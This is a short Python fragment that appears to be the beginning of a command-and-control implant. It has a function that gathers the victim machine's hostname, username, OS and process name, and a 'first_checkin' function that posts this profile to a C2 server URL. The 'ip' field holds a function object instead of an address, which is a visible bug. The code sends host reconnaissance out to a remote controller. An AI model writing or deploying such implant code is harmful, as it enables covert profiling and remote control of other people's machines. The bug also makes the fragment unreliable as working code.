import os
import sys
import time
import socket
import json
import subprocess
import requests

def get_sysinfo():
    """ return sys information """
    try:
        sysinfo = {
            "hostname": socket.gethostname(),
            "username": os.getlogin(),
            "os": f"{os.name} {sys.platform}",
            "ip": socket.getaddrinfo,
            "process": sys.argv[0]
        }
        return sysinfo
    except:
        pass

def first_checkin(SERVER_URL, json_info):
    """ Check in with the c2 server """
    try:
        response = requests.post(SERVER_URL, json=json_info)
        if response.status_code == 200:
            print("Check-in worked")
            return response.json()
        else:
            print("Check-in failed")
            return None
    except:
        return None